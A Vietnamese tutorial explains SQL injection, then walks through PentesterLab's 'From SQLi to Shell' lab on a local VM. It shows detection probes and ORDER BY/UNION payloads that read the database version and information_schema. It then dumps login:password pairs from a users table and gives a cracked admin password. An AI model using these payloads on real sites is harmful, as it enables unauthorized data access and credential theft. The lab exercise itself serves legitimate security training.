**1. Tìm hiểu sqli là gì? Xảy ra khi nào? Tác hại?
--------------------------------------------------

- Sql Injection (SQLi) là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp, Sql Injection có thể cho phép những kẻ tấn công thực hiện các thao tác, thêm, sửa, xóa… trên cơ sở dữ liệu của ứng dụng. 

- Lỗi này thường xảy ra trên các ứng dụng web có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase...

- Sql Injection được mô tả như là một trong những lỗ hổng bảo mật web nguy hiểm nhất. Khai thác Sql Injection, ngoài việc đoạt được quyền kiểm soát về mặt dữ liệu như đã nói ở trên, hacker còn có thể cài đặt backdoor trên server mà ứng dụng đang chạy, qua đó kiểm soát toàn bộ hệ thống…

**2. Chèn dữ liệu vào trong MySQL Database sử dụng PHP
------------------------------------------------------

Dữ liệu có thể được chèn vào MySQL Table bằng việc thực thi lệnh SQL INSERT thông qua hàm mysql_query trong PHP. Dưới đây là ví dụ đơn giản để chèn một record vào trong một Table có tên là employee.

**3. Lab from_sqli_to_shell:
----------------------------

https://pentesterlab.com/exercises/from_sqli_to_shell

Sau khi tải file .iso dựng máy áo chứa sql server chúng ta cần để thực hiện bài lab này

Truy cập vào trang của server ở đây là `http://192.168.1.102/`

<img src="http://i.imgur.com/X5EKRR3.jpg">

Như trong bài `Sql Injection (SQLi)` mà chúng ta đọc ở https://whitehat.vn/forum/thao-luan/web-security/963-web1-sql-injection---con-duong-khai-thac-pho-bien-qua-%93user-input%94 có thể nhận định rặng rỗi sqli xảy ra ở giá trị của biến id trên URL 

Ở đây ta kiếm được `http://192.168.1.102/cat.php?id=1` với giá trị id=1 cũng có thể thay được 2,3,4 ứng với các trang khác nhau

<img src="http://i.imgur.com/bTceP2n.jpg">

**Một số tính chất để phát hiện SQL injection khá hiệu quả:**

- Nếu truy cập /article.php?id=2-1 hiển thị được trang và truy cập /article.php?id=2-0 chuyển về article2, phép trừ được thực hiện bởi cơ sở dữ liệu, và bạn có thể đã tìm thấy một SQL injection

-Nếu truy cập /article.php?id=2-1 chuyển về article2 và truy cập màn /article.php?id=2-0 vẫn chuyển về article2, nó không chắc rằng bạn có SQL injection trên một số nguyên, nhưng bạn có thể có SQL injection trên một chuỗi giá trị như chúng ta sẽ thấy.

-Nếu bạn đặt một dấu ' trong URL (/article.php?id=1 '), bạn nhận được một lỗi.

Dựa vào đó ta sẽ kiểm tra lần lượt và phát hiện được lỗi SQL injection

http://192.168.1.102/cat.php?id=1  
http://192.168.1.102/cat.php?id=2-1 
http://192.168.1.102/cat.php?id=1-0 
http://192.168.1.102/cat.php?id=1'

<img src="http://i.imgur.com/m7YAlpI.jpg">

Bây giờ chúng ta đã tìm được SQL injection trong trang `http://192.168.1.102/cat.php`. Chúng ta cần khai thác nó đê có thông tin, để làm được điều này chúng ta cần sử dụng `UNION` có sẵn ở sql

Khai thác SQL injection sử dụng UNION sau các bước dưới đây:

1. Tìm số cột để thực hiện các UNION

2. Tìm những gì cột được lặp lại trong trang

3. Lấy thông tin từ cơ sở dữ liệu meta-bảng

4. Lấy thông tin từ các bảng / cơ sở dữ liệu khác

Để giải quyết vấn đề này có thể sử dụng `http://192.168.1.102/cat.php?id=1 UNION SELECT 1` sau đó tăng lên `1,2` rồi `1,2,3` rồi `1,2,3,4` sễ nhận được thông báo lỗi ở cột 2

Cách này thường hên xui với số cột ít nên chúng ta sẽ sử dụng lệnh `ORDER BY` `http://192.168.1.102/cat.php?id=1 ORDER BY 4` sẽ không có thông báo lỗi nên xác định được có 4 cột

<img src="http://i.imgur.com/m7YAlpI.jpg">

Giờ chúng ta đã xác định được số cột và bị lỗi ở cột nào ( ở đây cột 2). Ngoài ra chúng ta có thể xem một số thông tin như:

- the database version: `http://192.168.1.102/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4`

- the current user: `http://192.168.1.102/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4`

- the current database: `http://192.168.1.102/cat.php?id=1%20UNION%20SELECT%201,database(),3,4`

MySQL cung cấp các bảng chứa các thông về các dữ liệu. Chúng ta sẽ dùng information_schema để khai thác nó
`http://192.168.1.102/cat.php?id=1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns`

<img src="http://i.imgur.com/IQgNJx9.jpg">

Nhận ra ngay có xuất hiện bảng và cột user => vậy chắc chắn nó phải chứa thông tin tài khoản => lấy dữ liệu từ bản này 

`UNION SELECT 1,concat(login,':',password),3,4 FROM users;`

<img src="http://i.imgur.com/AVqK3Zg.jpg">

Vậy là chúng ta có được tài khoản: admin và mật khẩu được mã hóa dưỡi mã MD5 decode được mật khẩu: P4ssw0rd